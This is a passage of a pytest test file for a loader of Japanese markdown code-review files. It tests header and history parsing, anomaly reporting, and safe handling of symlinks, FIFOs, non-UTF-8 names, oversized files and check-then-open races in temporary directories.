import hashlib
import os
import shutil
import socket
import stat
import subprocess
import sys
from pathlib import Path
from typing import NamedTuple, NoReturn

import pytest

from tools.review_triage import inputs
from tools.review_triage.inputs import ReviewInputError, load_reviews
from tools.review_triage.models import (
    FindingStatus,
    Marker,
    Repository,
    ReviewBatch,
    ReviewFinding,
    Severity,
    finding_key,
)

REVIEWED_HEAD = "a" * 40
HEADER_LINE = "- 対象: PR #999 / head `aaaaaaaaaaaa` / 2026-09-22"
MINIMAL = HEADER_LINE + (
    "\n"
    "\n"
    "## Low\n"
    "\n"
    "### L-1: 最小の指摘\n"
    "\n"
    "- 位置: `a.py:1`\n"
    "- 検出時 HEAD: `aaaaaaaaaaaa`\n"
    "- 内容: 合成データ。\n"
    "- 根拠: 合成データ。\n"
    "- 推奨対応: なし。\n"
)
FIXTURES = Path(__file__).parent / "fixtures" / "input"
SYNTHETIC = FIXTURES / "pr-901-synthetic"
ODD = FIXTURES / "pr-902-odd"
ACTIVE_FIELDS = ("位置", "検出時 HEAD", "内容", "根拠", "推奨対応")
RESOLVED_FIELDS = ("検出時 HEAD", "解消確認時 HEAD", "確認根拠")


def _review_dir(tmp_path: Path, files: dict[str, str], name: str = "pr-999-runtime") -> Path:
    directory = tmp_path / name
    directory.mkdir(parents=True)
    for file_name, text in files.items():
        (directory / file_name).write_text(text, encoding="utf-8")
    return directory


def _load(
    directory: Path, *, repository: Repository = Repository.ENV, reviewed_head: str = REVIEWED_HEAD
) -> ReviewBatch:
    return load_reviews(directory, repository=repository, reviewed_head=reviewed_head)


def _line_no_by_prefix(path: Path, prefix: str, occurrence: int = 1) -> int:
    """fixture ``path`` の中で ``prefix`` で始まる（前方一致）``occurrence`` 番目の行の行番号（1 始まり）。

    行番号を手で数えないため。
    """
    seen = 0
    for number, line in enumerate(path.read_text(encoding="utf-8").split("\n"), start=1):
        if line.startswith(prefix):
            seen += 1
            if seen == occurrence:
                return number
    raise AssertionError(f"{prefix!r} (occurrence {occurrence}) not found in {path.name}")


def _line_no_exact(text: str, line: str) -> int:
    """実行時に組み立てた本文 ``text`` の中で ``line`` と完全一致する最初の行の行番号（1 始まり）。"""
    return text.split("\n").index(line) + 1


def _by_id(batch: ReviewBatch) -> dict[str, ReviewFinding]:
    return {finding.finding_id: finding for finding in batch.findings}


def _history(batch: ReviewBatch) -> list[tuple[str, str, str]]:
    return [(row.reviewed_at, row.head, row.mode) for row in batch.files[0].history]


def _unparsed_spans(batch: ReviewBatch) -> list[tuple[int, int, str]]:
    return [(block.line_start, block.line_end, block.reason) for block in batch.unparsed]


def test_rejects_bad_reviewed_head_repository_and_review_dir(tmp_path: Path) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    for head in ("", "abc123", "A" * 40, "a" * 41, "g" * 12, "a" * 12 + "\n"):
        with pytest.raises(ReviewInputError):
            load_reviews(directory, repository=Repository.ENV, reviewed_head=head)
    with pytest.raises(ReviewInputError):
        load_reviews(
            directory,
            repository="usaturn/other",  # pyright: ignore[reportArgumentType]
            reviewed_head=REVIEWED_HEAD,
        )
    with pytest.raises(ReviewInputError):
        _load(tmp_path / "missing")
    with pytest.raises(ReviewInputError):
        _load(directory / "ok.md")
    link = tmp_path / "linked-dir"
    link.symlink_to(directory, target_is_directory=True)
    with pytest.raises(ReviewInputError):
        _load(link)


def test_root_directory_is_rejected_without_opening_or_listing_it(monkeypatch: pytest.MonkeyPatch) -> None:
    # `/` は resolve() 後の名前が空なので、開く前・一覧を取る前に ReviewInputError で止まる
    def refuse(*args: object, **kwargs: object) -> NoReturn:
        raise AssertionError(f"/ must not be opened or listed: {args!r}")

    with monkeypatch.context() as patch:
        patch.setattr(os, "open", refuse)
        patch.setattr(os, "listdir", refuse)
        patch.setattr(Path, "iterdir", refuse)
        with pytest.raises(ReviewInputError):
            _load(Path("/"))


def test_review_dir_whose_name_is_not_utf8_is_rejected(tmp_path: Path) -> None:
    raw = os.path.join(os.fsencode(tmp_path), b"pr-\xff")
    try:
        os.mkdir(raw)
    except OSError:
        pytest.skip("the filesystem refuses names that are not valid UTF-8")
    directory = Path(os.fsdecode(raw))
    (directory / "ok.md").write_text(MINIMAL, encoding="utf-8")
    with pytest.raises(ReviewInputError, match=r"pr-\\xff"):
        _load(directory)


def test_review_input_error_escapes_a_parent_name_that_is_not_utf8(tmp_path: Path) -> None:
    # 例外の文言にも対になっていないサロゲートを入れない。親の不正なバイトは \xfe の形で示す
    raw = os.path.join(os.fsencode(tmp_path), b"parent-\xfe")
    try:
        os.mkdir(raw)
    except OSError:
        pytest.skip("the filesystem refuses names that are not valid UTF-8")
    with pytest.raises(ReviewInputError, match="must be an existing directory") as caught:
        _load(Path(os.fsdecode(raw)) / "missing")
    message = str(caught.value)
    message.encode("utf-8")
    assert "parent-\\xfe" in message


class _OpenRecord(NamedTuple):
    path: str
    flags: int
    dir_fd: int | None
    descriptor: int


def _record_opens(monkeypatch: pytest.MonkeyPatch) -> list[_OpenRecord]:
    """``os.open`` を実際に呼んだうえで、渡したパス・フラグ・``dir_fd`` と返した記述子を順に記録する。"""
    real_open = os.open
    opened: list[_OpenRecord] = []

    def recording_open(
        path: str | os.PathLike[str], flags: int, mode: int = 0o777, *, dir_fd: int | None = None
    ) -> int:
        descriptor = real_open(path, flags, mode, dir_fd=dir_fd)
        opened.append(_OpenRecord(os.fspath(path), flags, dir_fd, descriptor))
        return descriptor

    monkeypatch.setattr(os, "open", recording_open)
    return opened


def _swap_for_symlink(directory: Path, target: Path) -> Path:
    """``directory`` を横へ移し、元の場所に ``target`` への symlink を置く。移した先を返す。"""
    moved = directory.rename(directory.with_name(directory.name + "-moved-away"))
    directory.symlink_to(target, target_is_directory=True)
    return moved


def test_review_dir_that_becomes_a_symlink_before_it_is_opened_is_rejected(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    outside = _review_dir(tmp_path, {"outside.md": MINIMAL}, name="outside")
    real_open = os.open
    swapped: list[Path] = []

    def swap_then_open(
        path: str | os.PathLike[str], flags: int, mode: int = 0o777, *, dir_fd: int | None = None
    ) -> int:
        # 引数の検査の後、review_dir を開く直前に symlink へ差し替える
        if dir_fd is None and os.fspath(path) == os.fspath(directory) and not swapped:
            swapped.append(_swap_for_symlink(directory, outside))
        return real_open(path, flags, mode, dir_fd=dir_fd)

    monkeypatch.setattr(os, "open", swap_then_open)
    with pytest.raises(ReviewInputError, match="cannot be opened"):
        _load(directory)
    monkeypatch.undo()
    assert swapped == [tmp_path / "pr-999-runtime-moved-away"]


def test_review_dir_swapped_for_a_symlink_after_it_is_opened_is_not_followed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    outside = _review_dir(
        tmp_path, {"outside.md": MINIMAL.replace("最小の指摘", "outside-only-title")}, name="outside"
    )
    real_open = os.open
    swapped: list[Path] = []

    def open_then_swap(
        path: str | os.PathLike[str], flags: int, mode: int = 0o777, *, dir_fd: int | None = None
    ) -> int:
        descriptor = real_open(path, flags, mode, dir_fd=dir_fd)
        # review_dir を開いた直後に、元の場所を review_dir の外を指す symlink へ差し替える
        if dir_fd is None and os.fspath(path) == os.fspath(directory) and not swapped:
            swapped.append(_swap_for_symlink(directory, outside))
        return descriptor

    monkeypatch.setattr(os, "open", open_then_swap)
    batch = _load(directory)
    monkeypatch.undo()
    assert swapped == [tmp_path / "pr-999-runtime-moved-away"]
    assert directory.is_symlink()
    # 開いた記述子が元のディレクトリを固定するので、差し替え後のリンク先は読まない
    assert batch.review_dir == "pr-999-runtime"
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert [finding.title for finding in batch.findings] == ["最小の指摘"]
    assert batch.anomalies == ()
    dumped = batch.model_dump_json()
    assert "outside-only-title" not in dumped
    assert "outside.md" not in dumped


def test_listing_failure_raises_review_input_error_and_closes_the_directory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    opened = _record_opens(monkeypatch)
    real_close = os.close
    closed: list[int] = []

    def recording_close(fd: int) -> None:
        closed.append(fd)
        real_close(fd)

    def refuse_listing(path: object) -> NoReturn:
        raise PermissionError("listing refused")

    monkeypatch.setattr(os, "close", recording_close)
    monkeypatch.setattr(os, "listdir", refuse_listing)
    with pytest.raises(ReviewInputError, match="cannot be listed"):
        _load(directory)
    monkeypatch.undo()
    assert [record.path for record in opened] == [os.fspath(directory)]
    assert closed == [opened[0].descriptor]


def test_accepts_repository_given_as_string(tmp_path: Path) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    batch = load_reviews(
        directory,
        repository="usaturn/xrift-poc",  # pyright: ignore[reportArgumentType]
        reviewed_head=REVIEWED_HEAD,
    )
    assert batch.repository is Repository.ENV
    assert batch.review_dir == "pr-999-runtime"
    assert batch.reviewed_head == REVIEWED_HEAD
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert batch.files[0].model_name == "ok"


@pytest.mark.parametrize(
    "repository", ["usaturn/xrift-sample-world", "usaturn/xrift-sample-world", "someone/xrift-poc", ""]
)
def test_rejects_repository_other_than_the_env_repository(tmp_path: Path, repository: str) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    with pytest.raises(ReviewInputError, match="unknown repository"):
        load_reviews(
            directory,
            repository=repository,  # pyright: ignore[reportArgumentType]
            reviewed_head=REVIEWED_HEAD,
        )


@pytest.mark.parametrize(
    ("header_head", "reviewed_head", "differs"),
    [
        ("aaaaaaaaaaaa", "aaaaaaa", False),
        ("aaaaaaa", "a" * 40, False),
        ("abcdef0123", "abcdef0", False),
        ("abcdef0", "abcdef0123456789", False),
        ("abcdef1", "abcdef0123", True),
        ("aaaaaab", "a" * 40, True),
    ],
)
def test_short_heads_are_accepted_and_compared_as_prefixes_both_ways(
    tmp_path: Path, header_head: str, reviewed_head: str, differs: bool
) -> None:
    text = MINIMAL.replace("head `aaaaaaaaaaaa`", f"head `{header_head}`")
    batch = _load(_review_dir(tmp_path, {"m.md": text}), reviewed_head=reviewed_head)
    assert (batch.reviewed_head, batch.files[0].header_head) == (reviewed_head, header_head)
    expected = f"m.md: header head {header_head} differs from reviewed_head {reviewed_head}"
    assert batch.anomalies == ((expected,) if differs else ())
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]


def test_relative_review_dir_gives_the_same_batch_as_the_absolute_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"m.md": MINIMAL})
    absolute = _load(directory)
    monkeypatch.chdir(directory)
    relative = _load(Path("."))
    assert relative.review_dir == "pr-999-runtime"
    assert relative.model_dump() == absolute.model_dump()
    [finding] = relative.findings
    assert finding.finding_key == finding_key(Repository.ENV, "pr-999-runtime", "m/active/L-1")


def test_skips_entries_it_must_not_read(tmp_path: Path) -> None:
    outside = tmp_path / "outside.md"
    outside.write_text(MINIMAL, encoding="utf-8")
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL, ".hidden.md": MINIMAL, "notes.txt": "memo"})
    (directory / "link.md").symlink_to(outside)
    (directory / "sub").mkdir()
    os.mkfifo(directory / "pipe.md")
    (directory / "bad.md").write_bytes(b"\xff\xfe broken")
    batch = _load(directory)
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert batch.anomalies == (
        ".hidden.md: ignored hidden entry",
        "bad.md: skipped, not valid UTF-8",
        "link.md: skipped symlink",
        "notes.txt: ignored non-markdown entry",
        "pipe.md: skipped non-regular file",
        "sub: ignored directory",
    )


def test_entry_names_that_are_not_utf8_are_shown_escaped_and_not_read(tmp_path: Path) -> None:
    outside = tmp_path / "outside.md"
    outside.write_text(MINIMAL, encoding="utf-8")
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    raw = os.fsencode(directory)
    try:
        for name, data in ((b"\xff.md", MINIMAL.encode()), (b".\xfe", b"hidden"), (b"x\xfd.txt", b"memo")):
            with open(os.path.join(raw, name), "wb") as handle:
                handle.write(data)
        os.mkdir(os.path.join(raw, b"d\xfc"))
        os.symlink(os.fsencode(outside), os.path.join(raw, b"l\xfb.md"))
    except OSError:
        pytest.skip("the filesystem refuses names that are not valid UTF-8")
    batch = _load(directory)
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert [finding.source_file for finding in batch.findings] == ["ok.md"]
    # 名前の不正なバイトは \xff の形で記録し、名前が UTF-8 として不正な .md は開かずに読み飛ばす
    assert batch.anomalies == (
        ".\\xfe: ignored hidden entry",
        "d\\xfc: ignored directory",
        "l\\xfb.md: skipped symlink",
        "x\\xfd.txt: ignored non-markdown entry",
        "\\xff.md: skipped, not valid UTF-8",
    )
    batch.model_dump_json()


def test_skip_conditions_are_checked_in_table_order(tmp_path: Path) -> None:
    # hidden → symlink → ディレクトリ → 非 md の順に判定する。先に当てはまった理由だけを記録する
    outside = tmp_path / "outside.md"
    outside.write_text(MINIMAL, encoding="utf-8")
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL})
    (directory / "x.txt").symlink_to(outside)
    (directory / "d.md").mkdir()
    (directory / ".l.md").symlink_to(outside)
    batch = _load(directory)
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert batch.anomalies == (
        ".l.md: ignored hidden entry",
        "d.md: ignored directory",
        "x.txt: skipped symlink",
    )


def test_markdown_suffix_is_case_sensitive_and_checked_before_the_file_type(tmp_path: Path) -> None:
    directory = _review_dir(tmp_path, {"ok.md": MINIMAL, "X.MD": MINIMAL})
    os.mkfifo(directory / "p.fifo")
    batch = _load(directory)
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert batch.anomalies == ("X.MD: ignored non-markdown entry", "p.fifo: ignored non-markdown entry")


def test_skips_oversized_files_without_truncating(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    directory = _review_dir(tmp_path, {"big.md": MINIMAL})
    monkeypatch.setattr(inputs, "REVIEW_FILE_BYTE_LIMIT", 64)
    batch = _load(directory)
    assert batch.files == ()
    assert batch.findings == ()
    assert batch.anomalies == ("big.md: skipped, larger than 64 bytes", "no review files")


def test_file_of_exactly_the_limit_is_read(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    prefix = HEADER_LINE + " "
    text = prefix + "x" * (63 - len(prefix.encode())) + "\n"
    assert len(text.encode()) == 64
    monkeypatch.setattr(inputs, "REVIEW_FILE_BYTE_LIMIT", 64)
    batch = _load(_review_dir(tmp_path, {"edge.md": text}))
    assert [review_file.source_file for review_file in batch.files] == ["edge.md"]
    assert (batch.files[0].target_pr, batch.anomalies) == (999, ())


def _with_size(info: os.stat_result, size: int) -> os.stat_result:
    fields = list(info)
    fields[stat.ST_SIZE] = size
    return os.stat_result(fields)


def _report_entry_stat(monkeypatch: pytest.MonkeyPatch, name: str, reported: os.stat_result) -> list[str]:
    """review_dir の記述子からの lstat で ``name`` だけ ``reported`` を返す。

    対象は ``os.stat(name, dir_fd=..., follow_symlinks=False)`` の呼び出しだけで、それ以外は本物に任せる。
    lstat の後で項目が差し替えられた状況を再現する。偽の値を返すたびに ``name`` を記録したリストを返す。
    """
    real_stat = os.stat
    hits: list[str] = []

    def fake_stat(
        path: str | os.PathLike[str] | int, *, dir_fd: int | None = None, follow_symlinks: bool = True
    ) -> os.stat_result:
        if dir_fd is not None and not follow_symlinks and path == name:
            hits.append(name)
            return reported
        return real_stat(path, dir_fd=dir_fd, follow_symlinks=follow_symlinks)

    monkeypatch.setattr(os, "stat", fake_stat)
    return hits


def _report_fstat(monkeypatch: pytest.MonkeyPatch, name: str, reported: os.stat_result) -> list[str]:
    """``name`` を開いた記述子の ``os.fstat`` だけ ``reported`` を返す。開いた後で中身が変わった状況を再現する。"""
    opened = _record_opens(monkeypatch)
    real_fstat = os.fstat
    hits: list[str] = []

    def fake_fstat(fd: int) -> os.stat_result:
        # 閉じた記述子の番号は再利用されるので、その番号を最後に返した open だけを見る
        latest = next((record for record in reversed(opened) if record.descriptor == fd), None)
        if latest is not None and latest.path == name:
            hits.append(name)
            return reported
        return real_fstat(fd)

    monkeypatch.setattr(os, "fstat", fake_fstat)
    return hits


def test_entry_swapped_to_a_symlink_after_lstat_is_not_followed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    outside = tmp_path / "outside.md"
    outside.write_text(MINIMAL.replace("最小の指摘", "outside-only-title"), encoding="utf-8")
    directory = _review_dir(tmp_path, {})
    (directory / "swap.md").symlink_to(outside)
    # lstat は review_dir の外にある通常ファイルの情報を返すが、open は O_NOFOLLOW でリンクをたどらない
    hits = _report_entry_stat(monkeypatch, "swap.md", os.lstat(outside))
    batch = _load(directory)
    monkeypatch.undo()
    assert hits == ["swap.md"]
    assert batch.anomalies == ("swap.md: skipped, unreadable (OSError)", "no review files")
    assert (batch.files, batch.findings, batch.unparsed) == ((), (), ())
    assert "outside-only-title" not in batch.model_dump_json()


def test_fifo_swapped_in_after_lstat_is_skipped_without_blocking(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    regular = tmp_path / "regular.md"
    regular.write_text(MINIMAL, encoding="utf-8")
    directory = _review_dir(tmp_path, {})
    os.mkfifo(directory / "swap.md")
    # lstat は通常ファイルの情報を返すが、開いた後の fstat で FIFO と分かる
    hits = _report_entry_stat(monkeypatch, "swap.md", os.lstat(regular))
    real_open = os.open

    def nonblocking_only(
        path: str | os.PathLike[str], flags: int, mode: int = 0o777, *, dir_fd: int | None = None
    ) -> int:
        # O_NONBLOCK なしで FIFO を開くと書き手が現れるまで止まるので、止まる前にテストを失敗させる
        if os.fspath(path) == "swap.md" and not flags & os.O_NONBLOCK:
            raise AssertionError("swap.md would block without O_NONBLOCK")
        return real_open(path, flags, mode, dir_fd=dir_fd)

    monkeypatch.setattr(os, "open", nonblocking_only)
    batch = _load(directory)
    monkeypatch.undo()
    assert hits == ["swap.md"]
    assert (batch.files, batch.findings, batch.unparsed) == ((), (), ())
    assert batch.anomalies == ("swap.md: skipped non-regular file", "no review files")


def test_file_larger_than_its_lstat_size_is_skipped_without_truncating(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"grown.md": MINIMAL})
    # lstat の時点では上限以下に見えても、開いた後の大きさで判定し、切り詰めて読まない
    monkeypatch.setattr(inputs, "REVIEW_FILE_BYTE_LIMIT", 64)
    hits = _report_entry_stat(monkeypatch, "grown.md", _with_size(os.lstat(directory / "grown.md"), 1))
    batch = _load(directory)
    monkeypatch.undo()
    assert hits == ["grown.md"]
    assert (batch.files, batch.findings) == ((), ())
    assert batch.anomalies == ("grown.md: skipped, larger than 64 bytes", "no review files")


def test_file_growing_after_fstat_is_skipped_without_truncating(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = _review_dir(tmp_path, {"grown.md": MINIMAL})
    assert len(MINIMAL.encode()) > 64
    # lstat も fstat も 1 バイトと報告するが、実際には上限より大きい（開いた後に伸びた状況）。
    # 上限 + 1 バイトまで読んで大きさを確かめ、切り詰めた本文を解析しない
    small = _with_size(os.lstat(directory / "grown.md"), 1)
    monkeypatch.setattr(inputs, "REVIEW_FILE_BYTE_LIMIT", 64)
    stat_hits = _report_entry_stat(monkeypatch, "grown.md", small)
    fstat_hits = _report_fstat(monkeypatch, "grown.md", small)
    batch = _load(directory)
    monkeypatch.undo()
    assert (stat_hits, fstat_hits) == (["grown.md"], ["grown.md"])
    assert (batch.files, batch.findings, batch.unparsed) == ((), (), ())
    assert batch.anomalies == ("grown.md: skipped, larger than 64 bytes", "no review files")


def test_fstat_size_over_the_limit_is_skipped_before_reading(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    directory = _review_dir(tmp_path, {"small.md": "0123456789"})
    monkeypatch.setattr(inputs, "REVIEW_FILE_BYTE_LIMIT", 64)
    # lstat の後で上限を超えたことが fstat で分かれば、読む前に止める（R-7）
    hits = _report_fstat(monkeypatch, "small.md", _with_size(os.lstat(directory / "small.md"), 65))
    real_read = os.read
    reads: list[int] = []

    def recording_read(fd: int, length: int) -> bytes:
        reads.append(fd)
        return real_read(fd, length)

    monkeypatch.setattr(os, "read", recording_read)
    batch = _load(directory)
    monkeypatch.undo()
    assert (hits, reads) == (["small.md"], [])
    assert batch.anomalies == ("small.md: skipped, larger than 64 bytes", "no review files")


@pytest.mark.skipif(os.geteuid() == 0, reason="root can read files without permission bits")
def test_records_unreadable_files(tmp_path: Path) -> None:
    directory = _review_dir(tmp_path, {"locked.md": MINIMAL, "ok.md": MINIMAL})
    locked = directory / "locked.md"
    locked.chmod(0)
    try:
        batch = _load(directory)
    finally:
        locked.chmod(stat.S_IRUSR | stat.S_IWUSR)
    assert [review_file.source_file for review_file in batch.files] == ["ok.md"]
    assert batch.anomalies == ("locked.md: skipped, unreadable (PermissionError)",)


def test_empty_directory_reports_no_review_files(tmp_path: Path) -> None:
    batch = _load(_review_dir(tmp_path, {}))
    assert batch.files == ()
    assert batch.anomalies == ("no review files",)


def test_reads_header_and_review_history() -> None:
    batch = _load(SYNTHETIC)
    files = {review_file.source_file: review_file for review_file in batch.files}
    assert list(files) == ["alpha-model.md", "beta-model.md", "gamma-model.md"]
    alpha, beta, gamma = files["alpha-model.md"], files["beta-model.md"], files["gamma-model.md"]
    assert (alpha.model_name, alpha.target_pr, alpha.header_head, alpha.header_date) == (
        "alpha-model",
        901,
        "aaaaaaaaaaaa",
        "2026-09-20",
    )
    assert [(row.reviewed_at, row.head, row.mode) for row in alpha.history] == [
        ("2026-09-19T01:00:00Z", "999999999999", "Initial"),
        ("2026-09-20T02:00:00Z", "aaaaaaaaaaaa", "Update"),
    ]
    assert (beta.target_pr, beta.header_head, beta.header_date) == (901, "bbbbbbbbbbbb", "2026-09-18")
    assert [row.head for row in beta.history] == ["bbbbbbbbbbbb"]
    assert (gamma.target_pr, gamma.header_head, gamma.header_date) == (901, "aaaaaaaaaaaa", "2026-09-20")


@pytest.mark.parametrize(
    ("first_line", "expected"),
    [
        ("- 対象: PR #12 / head `0123456789ab` / 2026-09-01", (12, "0123456789ab", "2026-09-01")),
        ("- 対象: PR #12 / head 0123456789ab / 2026-09-01 08:32 UTC", (12, "0123456789ab", "2026-09-01")),
        (
            "- 対象: [PR #12](https://example.invalid/pull/12) / head `0123456789ab` / 2026-09-01",
            (12, "0123456789ab", "2026-09-01"),
        ),
        ("# PR #12 レビュー", (None, None, None)),
        ("- 対象: local main `0123456`...HEAD `89abcde` / 2026-08-01", (None, None, None)),
        ("- 対象: PR #0 / head `0123456789ab` / 2026-09-01", (None, None, None)),
        ("x - 対象: PR #12 / head `0123456789ab` / 2026-09-01", (None, None, None)),
        ("- 対象: PR #12 / head `0123456789ab` / 2026-09-0112", (None, None, None)),
    ],
)
def test_header_line_variants(
    tmp_path: Path, first_line: str, expected: tuple[int | None, str | None, str | None]
) -> None:
    directory = _review_dir(tmp_path, {"m.md": first_line + "\n\n## Summary\n\n本文。\n"})
    batch = load_reviews(directory, repository=Repository.ENV, reviewed_head="0123456789ab")
    review_file = batch.files[0]
    assert (review_file.target_pr, review_file.header_head, review_file.header_date) == expected
    assert ("m.md:1: unrecognized header line" in batch.anomalies) == (expected[0] is None)


def test_pr_number_too_long_for_int_is_an_unrecognized_header(tmp_path: Path) -> None:
    # Python の int 変換は既定で 4300 桁までなので、4301 桁の PR 番号は読めない。1 ファイルの問題で全体を止めない
    text = MINIMAL.replace("PR #999", "PR #1" + "0" * 4300)
    previous = sys.get_int_max_str_digits()
    sys.set_int_max_str_digits(4300)
    try:
        batch = _load(_review_dir(tmp_path, {"m.md": text}))
    finally:
        sys.set_int_max_str_digits(previous)
    review_file = batch.files[0]
    assert (review_file.target_pr, review_file.header_head, review_file.header_date) == (None, None, None)
    assert batch.anomalies == ("m.md:1: unrecognized header line",)
    [finding] = batch.findings
    assert (finding.finding_id, finding.reviewed_head) == ("m/active/L-1", None)


def test_history_rows_with_an_empty_first_or_third_cell_are_recorded(tmp_path: Path) -> None:
    empty_first = "|  | `aaaaaaaaaaaa` | Initial |"
    empty_third = "| 2026-09-21T00:00:00Z | `aaaaaaaaaaaa` |  |"
    four_cells = "|| 2026-09-22T00:00:00Z | `aaaaaaaaaaaa` | Update |"
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Review history",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| --- | --- | --- |",
            empty_first,
            empty_third,
            four_cells,
            "| 2026-09-22T01:00:00Z | `aaaaaaaaaaaa` | Update |",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [(row.reviewed_at, row.head, row.mode) for row in batch.files[0].history] == [
        ("2026-09-22T01:00:00Z", "aaaaaaaaaaaa", "Update")
    ]
    assert batch.anomalies == tuple(
        f"m.md:{_line_no_exact(text, row)}: unrecognized review history row"
        for row in (empty_first, empty_third, four_cells)
    )


def test_fenced_lines_in_review_history_are_not_rows(tmp_path: Path) -> None:
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Review history",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| --- | --- | --- |",
            "| 2026-09-20T00:00:00Z | `aaaaaaaaaaaa` | Initial |",
            "",
            "```text",
            "| x | `0123456789ab` | y |",
            "| junk |",
            "```",
            "| 2026-09-21T00:00:00Z | `bbbbbbbbbbbb` | Update |",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    # フェンス内の行は表の行として読まない（履歴にも anomaly にもならない）
    assert _history(batch) == [
        ("2026-09-20T00:00:00Z", "aaaaaaaaaaaa", "Initial"),
        ("2026-09-21T00:00:00Z", "bbbbbbbbbbbb", "Update"),
    ]
    assert batch.anomalies == ()


@pytest.mark.parametrize("sub_heading", ["### 補足", "### L-1: 履歴の中にある指摘の形の見出し"])
def test_sub_headings_inside_review_history_do_not_stop_the_table(tmp_path: Path, sub_heading: str) -> None:
    broken = "| broken |"
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Review history",
            "",
            "### 過去の実行",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| --- | --- | --- |",
            "| 2026-09-20T00:00:00Z | `aaaaaaaaaaaa` | Initial |",
            sub_heading,
            "| 2026-09-21T00:00:00Z | `aaaaaaaaaaaa` | Update |",
            broken,
            "",
            "## Summary",
            "",
            "| 2026-09-22T00:00:00Z | `aaaaaaaaaaaa` | NotHistory |",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    # 節の境界は # と ## だけなので、### の小見出しの後の表の行も履歴として読む
    assert _history(batch) == [
        ("2026-09-20T00:00:00Z", "aaaaaaaaaaaa", "Initial"),
        ("2026-09-21T00:00:00Z", "aaaaaaaaaaaa", "Update"),
    ]
    assert batch.anomalies == (f"m.md:{_line_no_exact(text, broken)}: unrecognized review history row",)
    # 指摘の形の見出しは、履歴の節でも「指摘の節の外にある指摘の見出し」として unparsed に残す
    heading = _line_no_exact(text, sub_heading)
    outside = [(heading, heading + 2, "finding heading outside a finding section")]
    assert _unparsed_spans(batch) == (outside if sub_heading.startswith("### L-1:") else [])


def test_review_history_separators_with_colons_and_repeated_header_rows(tmp_path: Path) -> None:
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Review history",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| :--- | :---: | ---: |",
            "| 2026-09-20T00:00:00Z | `aaaaaaaaaaaa` | Initial |",
            "",
            "| reviewed_at | head commit | mode |",
            "| --- | --- | --- |",
            "| 2026-09-21T00:00:00Z | `bbbbbbbbbbbb` | Update |",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    # 区切り行はコロン付きでも読み飛ばし、同じ節の 2 つ目の表の見出し行も 1 つ目と同じく読み飛ばす
    assert _history(batch) == [
        ("2026-09-20T00:00:00Z", "aaaaaaaaaaaa", "Initial"),
        ("2026-09-21T00:00:00Z", "bbbbbbbbbbbb", "Update"),
    ]
    assert batch.anomalies == ()


def test_review_history_head_cells_must_be_hex_heads_as_a_whole(tmp_path: Path) -> None:
    rows = [
        "| 2026-09-21T00:00:00Z | `aaaaaaaaaaaa` (rebased) | Update |",
        "| 2026-09-21T01:00:00Z | `AAAAAAAAAAAA` | Update |",
        "| 2026-09-21T02:00:00Z | `" + "a" * 41 + "` | Update |",
    ]
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Review history",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| --- | --- | --- |",
            "| 2026-09-20T00:00:00Z | aaaaaaa | Initial |",
            *rows,
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert _history(batch) == [("2026-09-20T00:00:00Z", "aaaaaaa", "Initial")]
    assert batch.anomalies == tuple(
        f"m.md:{_line_no_exact(text, row)}: unrecognized review history row" for row in rows
    )


def test_parses_active_resolved_and_pending_findings() -> None:
    batch = _load(SYNTHETIC)
    assert [finding.finding_id for finding in batch.findings] == [
        "alpha-model/active/L-1",
        "alpha-model/active/I-1",
        "alpha-model/active/I-2",
        "alpha-model/resolved/I-1",
        "beta-model/active/M-1",
        "beta-model/active/L-1",
        "beta-model/active/L-1~2",
        "beta-model/active/M-2",
        "beta-model/pending/I-3",
    ]
    assert [finding.finding_id for finding in batch.active_findings()] == [
        "alpha-model/active/L-1",
        "alpha-model/active/I-1",
        "alpha-model/active/I-2",
        "beta-model/active/M-1",
        "beta-model/active/L-1",
        "beta-model/active/L-1~2",
        "beta-model/active/M-2",
    ]
    findings = _by_id(batch)
